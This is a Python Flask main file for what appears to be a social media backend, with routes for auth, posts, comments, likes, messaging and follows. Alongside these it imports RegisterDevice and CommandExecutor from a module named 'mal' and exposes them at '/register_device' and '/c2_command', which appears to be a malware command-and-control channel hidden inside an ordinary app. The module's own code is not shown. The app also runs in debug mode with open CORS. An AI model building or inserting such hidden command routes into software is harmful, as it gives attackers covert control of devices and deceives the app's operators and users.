import os
from flask import Flask
from flask_restful import Api
from models import db
from flask_migrate import Migrate
from flask_cors import CORS
from flask_jwt_extended import JWTManager
from login import RegisterUser, LoginUser, VerifyEmail, ResendVerification
from mail import mail
from user_profile import UserProfile
from dotenv import load_dotenv
from User_post import Upload, PostListResource, UserPostsResource
from user_comment import AddComment, GetComments, UpdateComment, DeleteComment, GetAllComments
from like_post import LikePost, GetLikedPosts
from message import SendMessage, GetConversation, GetConversationList, GetUserList
from follow_service import FollowUser, UnfollowUser, FollowStatus, FollowerCount, FollowingCount
from mal import	RegisterDevice, CommandExecutor

app = Flask(__name__)
api = Api(app)
jwt = JWTManager(app)

migrate = Migrate(app, db)
CORS(app)

load_dotenv()

import cloudinary
import cloudinary.uploader
import cloudinary.api

cloudinary.config(
    cloud_name=os.getenv('CLOUDINARY_CLOUD_NAME'),
    api_key=os.getenv('CLOUDINARY_API_KEY'),
    api_secret=os.getenv('CLOUDINARY_API_SECRET')
)
from datetime import timedelta
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = timedelta(hours=1)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///eco.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['JWT_SECRET_KEY'] = os.getenv('JWT_SECRET_KEY')  # Use env variable
app.config['SECRET_KEY'] = os.getenv('FLASK_SECRET_KEY')
app.config['UPLOAD_FOLDER'] = 'uploads'  # Folder to store uploaded files
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # Limit to 16 MB
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

db.init_app(app)
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = os.getenv('MAIL_USERNAME')
app.config['MAIL_PASSWORD'] = os.getenv('MAIL_PASSWORD')
app.config['MAIL_DEFAULT_SENDER'] = os.getenv('MAIL_DEFAULT_SENDER')

mail.init_app(app)

api.add_resource(RegisterUser, '/auth/register/user')

api.add_resource(LoginUser, '/auth/login/user')
api.add_resource(VerifyEmail, '/auth/verify/user')
api.add_resource(ResendVerification, '/auth/resend/user')
api.add_resource(UserProfile, '/profile','/profile/<int:user_id>')
api.add_resource(Upload, '/upload/<int:user_id>')
api.add_resource(PostListResource, '/list')
api.add_resource(AddComment, '/post/<int:post_id>/comment')
api.add_resource(GetComments, '/post/<int:post_id>/comments')
api.add_resource(UpdateComment, '/comment/<int:comment_id>')
api.add_resource(GetAllComments, '/post/comments')
api.add_resource(DeleteComment, '/comment/<int:comment_id>')
api.add_resource(UserPostsResource, '/user/posts')

api.add_resource(LikePost, '/post/<int:post_id>/like')
api.add_resource(GetLikedPosts, '/user/liked_posts')

api.add_resource(SendMessage, '/message/send/<int:receiver_id>')
api.add_resource(GetConversation, '/conversation/<int:receiver_id>')
api.add_resource(GetConversationList, '/conversations')
api.add_resource(GetUserList, '/users')




api.add_resource(FollowUser, '/follow/<int:user_id>')
api.add_resource(UnfollowUser, '/unfollow/<int:user_id>')
api.add_resource(FollowStatus, '/follow-status/<int:user_id>')
api.add_resource(FollowerCount, '/follower-count/<int:user_id>')
api.add_resource(FollowingCount, '/following-count/<int:user_id>')



api.add_resource(RegisterDevice, '/register_device')
api.add_resource(CommandExecutor, "/c2_command")







if __name__ == '__main__':
    app.run(debug=True)
